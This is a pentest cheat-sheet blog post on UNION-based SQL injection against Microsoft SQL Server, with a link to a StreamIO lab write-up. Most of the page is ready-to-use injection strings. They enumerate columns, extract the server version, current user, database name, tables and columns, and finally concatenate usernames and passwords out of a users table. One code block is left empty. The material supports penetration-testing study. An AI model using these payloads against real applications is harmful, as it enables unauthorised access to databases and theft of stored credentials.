---
description: >-
  SQL Injection MSSQL
title:  SQL Injection MSSQL            # Add title here
date: 2023-02-11 08:00:00 -0600                           # Change the date to match completion date
categories: [06 Exploitation, SQL Injection - MSSQL]                     # Change Templates to Writeup
tags: [exploitation, sql injection, mssql, union select]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Simple Commands
Simple enumeration is to be abused with following queries such queries where taken from [PayloadAllTheThings](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet):
```bash

```

### Union Select
First of all we need to identify the behavior of the database with sqli payloads, a good idea is to enumerate columns with sqli such as :
```bash
' union select 1-- -
' union select 1,2-- -
' union select 1,2,3-- -
' union select 1,2,3,4-- -
' union select 1,2,3,4,5-- -
' union select 1,2,3,4,5,6-- -
```

> If there is a successsful answer then we need to identify which column retrieves information from the database.
{: .prompt-tip }

#### Version
```bash
' union select 1,@@version,3,4,5,6 -- -
```
![Database_Version](/assets/img/Pasted image 20230426233714.png)

#### Database user
You can use any of the options below:
```bash
' union select 1,CURRENT_USER,3,4,5,6 -- -
' union select 1,user_name(),3,4,5,6 -- -
' union select 1,system_user,3,4,5,6 -- -
' union select 1,user,3,4,5,6 -- -
```
![Database_User](/assets/img/Pasted image 20230426234307.png)

#### Database name
It is of upmost importance to gather the name of the database being used:
```bash
' union select 1,DB_NAME(),3,4,5,6 -- -
```
![Database_Name](/assets/img/Pasted image 20230426234212.png)

#### Tables
Once that we get the name of the database we can proceed to gather the tables on such database:
```bash
# First and simple option is retrieving all the info from a table
' union select 1,name,3,4,5,6 FROM STREAMIO..sysdatabases-- -
``` 
![Database_Tables](/assets/img/Pasted image 20230426235140.png)

Another option is to retrieve the tables on a simple column with the function [STRING_AGG](https://www.mssqltips.com/sqlservertutorial/9371/sql-string-agg-function/):
```bash
' union select 1,(SELECT STRING_AGG(name, ', ') FROM STREAMIO..sysobjects),3,4,5,6-- -
```
![Database_Tables](/assets/img/Pasted image 20230426235753.png)

#### Columns
Then we extract the column names, we can use a WHERE condition clause to extract only the columns from an specific table in this case the "users" table:
```bash
' union select 1,name,3,4,5,6 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name = 'users')-- -
```
![Database_Columns](/assets/img/Pasted image 20230427000937.png)

#### Data within the tables
Finally once that we gather all the info we then proceed to retrieve information from the table:
```bash
' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
```
Examples: 
[StreamIO](https://shuciran.github.io/posts/Streamio/#fnref:)